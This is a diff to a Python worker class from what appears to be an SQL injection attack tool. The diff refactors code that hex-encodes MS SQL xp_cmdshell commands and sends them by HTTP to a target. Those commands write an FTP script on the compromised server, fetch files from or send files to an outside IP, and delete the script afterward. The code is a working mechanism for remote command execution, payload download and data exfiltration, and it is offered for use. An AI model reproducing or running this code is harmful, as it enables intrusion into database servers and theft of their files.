@@ -136,50 +136,50 @@ class Worker(QtCore.QThread):
         tmp_file = self.vars['ftpPath'] + "xftp.txt"
         
         #del ..\temp\ftp.txt /Q
-        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #echo open 127.0.0.1 21> ..\temp\ftp.txt
-        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo open " + ipaddr + "> " + tmp_file + "'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo open " + ipaddr + "> " + tmp_file + "'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #echo login>> ..\temp\ftp.txt
-        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['login'] + ">> " + tmp_file + "'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['login'] + ">> " + tmp_file + "'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #echo password>> ..\temp\ftp.txt
-        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['password'] + ">> " + tmp_file + "'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['password'] + ">> " + tmp_file + "'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         for file in ftpFiles:
             #Use SEND or GET ftp command?
             if self.vars['ftp_mode'] == "get":
                 #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
-                self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo get " + file + " " + self.vars['ftpPath']\
+                hex = core.txtproc.strToHex("master..xp_cmdshell 'echo get " + file + " " + self.vars['ftpPath']\
                 + file + ">> " + tmp_file + "'", True)
-                query = self.wq.buildQuery(self.qstring, self.vars)
+                query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             else:
                 #echo send c:\path\file.exe>> ..\temp\ftp.txt
-                self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo send " + self.vars['ftpPath'] +  file + ">> " + tmp_file + "'", True)
-                query = self.wq.buildQuery(self.qstring, self.vars)
+                hex = core.txtproc.strToHex("master..xp_cmdshell 'echo send " + self.vars['ftpPath'] +  file + ">> " + tmp_file + "'", True)
+                query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
             self.wq.httpRequest(query, True, self.vars)
             
         #echo bye>> ..\temp\ftp.txt
-        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'echo bye>> " + tmp_file + "'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo bye>> " + tmp_file + "'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #ftp -s:..\temp\ftp.txt IP
-        self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'ftp -s:" + tmp_file + "'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'ftp -s:" + tmp_file + "'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
         #del ..\temp\ftp.txt /Q
-        #self.vars['hex'] = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
-        query = self.wq.buildQuery(self.qstring, self.vars)
+        hex = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
+        query = self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
         
